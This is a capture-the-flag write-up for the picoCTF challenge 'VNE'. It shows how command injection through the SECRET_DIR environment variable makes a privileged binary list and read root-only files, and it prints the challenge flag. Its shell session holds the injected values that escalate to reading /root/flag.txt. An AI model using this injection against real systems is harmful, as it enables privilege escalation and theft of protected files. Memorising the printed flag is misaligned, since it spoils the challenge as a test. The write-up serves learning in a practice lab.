# VNE

This challenge from [picoCTF](https://play.picoctf.org/practice/challenge/387) ask us to connect in ssh to a remote linux environment.

Once we are connectedd, we can execute a binnary named `bin`:

```
❯ ssh ctf-player@saturn.picoctf.net -p 64293
ctf-player@saturn.picoctf.net's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Nov 20 09:57:07 2024 from 127.0.0.1
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
```
It asks us to set the `SECRET_DIR` to any directory, let's try `/root`:
```
ctf-player@pico-chall$ export SECRET_DIR=/root
ctf-player@pico-chall$ ./bin
Listing the content of /root as root:
flag.txt
ctf-player@pico-chall$ export SECRET_DIR='/root'
ctf-player@pico-chall$ ./bin
Listing the content of /root as root:
flag.txt
```
Now, let's try to inject some commands in this varialbe:
```
ctf-player@pico-chall$ export SECRET_DIR='ls -la /root'
ctf-player@pico-chall$ ./bin
Listing the content of ls -la /root as root:
ls: cannot access 'ls': No such file or directory
/root:
total 12
drwx------ 1 root root   22 Aug  4  2023 .
drwxr-xr-x 1 root root   62 Nov 20 09:55 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root   41 Aug  4  2023 flag.txt
Error: system() call returned non-zero value: 512
ctf-player@pico-chall$ export SECRET_DIR='ls -la /root | cat /root/flag.txt'
ctf-player@pico-chall$ ./bin
Listing the content of ls -la /root | cat /root/flag.txt as root:
ls: cannot access 'ls'picoCTF{Power_t0_man!pul4t3_3nv_1ac0e5a3}: No such file or directory
ctf-player@pico-chall$
```

That's it, we get the flag.